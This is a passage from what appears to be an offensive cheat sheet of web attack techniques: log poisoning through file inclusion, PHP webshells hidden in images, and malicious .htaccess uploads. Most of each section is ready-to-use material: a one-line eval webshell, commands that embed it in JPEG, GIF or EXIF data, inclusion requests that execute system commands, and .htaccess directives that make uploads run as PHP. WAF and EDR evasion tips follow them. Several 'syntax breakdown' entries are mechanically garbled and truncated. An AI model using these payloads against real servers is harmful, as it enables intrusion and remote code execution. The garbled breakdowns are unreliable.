?file=/var/log/nginx/access.log&cmd=whoami
```
**Syntax breakdown:**
- `system()` — system command execution _function_
- `curl` — HTTP request tool _command_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
Use URL encoding or Base64 encoding to bypass keyword filtering
```
**Syntax breakdown:**
- `Use URL encoding or Base64 encoding to bypass keyword filtering` — attack payload _value_

**Overview:** Log poisoning RCE is one of the most reliable LFI→RCE upgrade paths: inject PHP code into the web server log (via request headers), then load the log file via a file inclusion vulnerability to trigger code execution. It applies to mainstream web servers such as Apache/Nginx.

**Vulnerability Principle:** Log poisoning injection points: 1) the User-Agent/Referer fields in the Apache access.log 2) the Nginx access.log 3) the error log error.log (deliberately trigger an error by including a nonexistent file) 4) the FTP log (vsftpd) 5) the username field in the SSH log (/var/log/auth.log).

**Exploitation Method:** Complete exploitation flow:
1. Discover the file inclusion vulnerability
2. Determine the log file path
3. Inject malicious code into the log
4. Include the log file
5. Execute commands to obtain a shell

**Defensive Measures:** Defenses:
1. Restrict log file access
2. Filter special characters in the log
3. Disable file inclusion
4. Use open_basedir restriction

---

### Image-Embedded Shell RCE  `rce-image`
_Use an image-embedded shell to achieve RCE_
Subcategory: **Image-Embedded Shell** · tags: `rce` `image` `webshell` `upload`

**Prerequisites:**
- A file upload exists
- A file inclusion exists

**Attack Chain:**

**1. Create an image-embedded shell**
> Create an image-embedded shell
```
# Windows
copy test.jpg/b + shell.php/a shell.jpg

# Linux
cat test.jpg shell.php > shell.jpg

# Append PHP code at the end of the image
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg
```
**Syntax breakdown:**
- `copy test.jpg/b + shell.php/a` — on Windows, binary-merge the image and PHP code _command_
- `cat test.jpg shell.php > shell.jpg` — on Linux, concatenate the image and PHP code _command_
- `echo "<?php ...?>" >> test.jpg` — append PHP code at the end of the image _command_

**2. Image-embedded shell content**
> Image-embedded shell format
```
GIF89a
<?php @eval($_POST[cmd]);?>

# Or use an Exif comment
exiftool -Comment="<?php @eval($_POST[cmd]);?>" test.jpg
```
**Syntax breakdown:**
- `GIF89a` — GIF file header magic bytes, used to pass file header detection _command_
- `<?php @eval($_POST[cmd]);?>` — one-liner webshell, @ suppresses error messages _value_
- `exiftool -Comment=` — write PHP code into the image EXIF comment field, more stealthy _command_

**3. Use file inclusion to execute**
> File inclusion execution
```
# Combined with a file inclusion vulnerability
?file=upload/shell.jpg
POST: cmd=system('whoami');

# Combined with phar://
?file=phar://upload/shell.jpg
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**4. Combined with .htaccess**
> Combined with .htaccess execution
_platform: linux_
```
# Upload .htaccess
AddType application/x-httpd-php .jpg

# Directly access the image to execute
http://target/upload/shell.jpg
```
**Syntax breakdown:**
- `AddType application/x-httpd-php .jpg` — Apache configuration to parse .jpg as PHP _command_
- `http://target/upload/shell.jpg` — directly access the image to trigger PHP execution, no file inclusion needed _value_

**WAF/EDR Bypass Variants:**

**File header spoofing**
> File header spoofing
```
Use a real image file header
Ensure the image can be previewed normally
```
**Syntax breakdown:**
- `Real image file header` — use a complete image file header (such as JPEG's FF D8 FF E0) _command_
- `Can be previewed normally` — ensure the image can open and display normally, avoiding file integrity check failure _parameter_

**Overview:** Image RCE exploits vulnerabilities or features of image processing libraries (ImageMagick/GD/Pillow) to execute code when the server processes an uploaded image. ImageMagick's "ImageTragick" (CVE-2016-3714) is the most famous case.

**Vulnerability Principle:** ImageMagick uses a delegate (delegate handler) to execute external commands: the push graphic-context directive in the MVG format, the xlink:href external reference in SVG, the ephemeral protocol to delete files, the MSL format to write files, and so on. Specific versions of the GD library also have vulnerabilities such as heap overflows.

**Exploitation Method:** Complete exploitation flow:
1. Create an image-embedded shell
2. Upload the image-embedded shell
3. Find the file inclusion point
4. Include the image-embedded shell to execute code
5. Obtain a shell

**Defensive Measures:** Defenses:
1. Check the complete file content
2. Redraw the image to remove malicious code
3. Disable file inclusion
4. Store in a non-web directory

---

### .htaccess Exploitation  `rce-htaccess`
_Use the .htaccess file to achieve RCE_
Subcategory: **.htaccess** · tags: `rce` `htaccess` `apache` `upload`

**Prerequisites:**
- Apache server
- .htaccess can be uploaded

**Attack Chain:**

**1. Parse other extensions**
> Modify the file type parsing
_platform: linux_
```
# Make .jpg files execute as PHP
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# Make .txt files execute as PHP
AddType application/x-httpd-php .txt
```
**Syntax breakdown:**
- `AddType` — set the MIME type _value_
- `AddHandler` — set the handler _value_

**2. Auto-include**
> Auto-include a file
_platform: linux_
```
# Automatically include before every file
php_value auto_prepend_file /var/www/html/shell.php

# Automatically include after every file
php_value auto_append_file /var/www/html/shell.php
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Automatically include before every file
php_value auto_prepend_file /var/www/html/shell.php

# Automatically include after every file
php_value auto_append_file /var/www/html/shell.php` — parameters and payload content _value_

**3. Pseudo-static RCE**
> Pseudo-static configuration
_platform: linux_
```
# Use mod_rewrite
RewriteEngine on
RewriteRule ^(.*)$ $1 [L]

# A more dangerous configuration
SetHandler application/x-httpd-php
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Use mod_rewrite
RewriteEngine on
RewriteRule ^(.*)$ $1 [L]

# A more dangerous configuration
SetHandler application/x-httpd-php` — parameters and payload content _value_

**4. Error page inclusion**
> Error page exploitation
_platform: linux_
```
# Custom error pages
ErrorDocument 404 /shell.php
ErrorDocument 500 /shell.php
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Custom error pages
ErrorDocument 404 /shell.php
ErrorDocument 500 /shell.php` — parameters and payload content _value_

**5. File inclusion bypass**
> PHP configuration modification
_platform: linux_
```
# Set the include path
php_value include_path "/var/www/html/uploads"

# Disable security restrictions
php_flag safe_mode off
php_flag display_errors on
```
**Syntax breakdown:**
- `# Set the include path
php_value include_path "/var/www/html/uploads"

# Disable security restrictions
php_f` — attack payload _value_

**WAF/EDR Bypass Variants:**

**Newline bypass**
> Newline bypass
_platform: linux_
```
Use a newline character to separate the configuration
to bypass single-line detection
```
**Syntax breakdown:**
- `Use a newline character to separate the configuration
to bypass single-line detection` — attack payload _value_

**Overview:** .htaccess file RCE changes how the server processes specific file types (such as parsing .jpg files as PHP) by uploading or modifying Apache's .htaccess configuration file, or directly injects PHP code via php_value.

**Vulnerability Principle:** .htaccess RCE methods: 1) AddType application/x-httpd-php .jpg makes image files be parsed as PHP 2) php_value auto_prepend_file combined with php://input to inject code 3) SetHandler processes all files in the directory as PHP 4) php_flag engine combined with .user.ini.

**Exploitation Method:** Complete exploitation flow:
1. Upload a malicious .htaccess
2. Configure file type parsing
3. Upload a disguised WebShell
4. Access to execute
5. Obtain server privileges

**Defensive Measures:** Defenses:
1. Prohibit uploading .htaccess
2. Disable AllowOverride
3. Validate the filename against an allowlist
4. Rename the uploaded file

---
